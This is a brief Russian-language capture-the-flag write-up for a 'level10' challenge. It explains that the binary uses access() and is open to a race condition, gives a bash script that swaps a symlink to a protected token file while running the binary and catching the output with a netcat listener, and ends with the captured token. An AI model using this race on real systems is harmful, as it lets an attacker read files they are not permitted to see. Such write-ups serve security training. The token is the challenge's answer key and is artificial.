В папке исполняемый файл и token

Через ltrace узнаем, что в коде используется команда access. Она уязвима при многократном применении

#!/bin/bash
for i in {1..100}; do ln -sf /tmp/test /tmp/exploit; ln -sf /home/user/level10/token /tmp/exploit; done &
for i in {1..100}; do ./level10 /tmp/exploit 127.0.0.1; done &
for i in {1..100}; do nc -lk 6969; done

token: feulo4b72j7edeahuete3no7c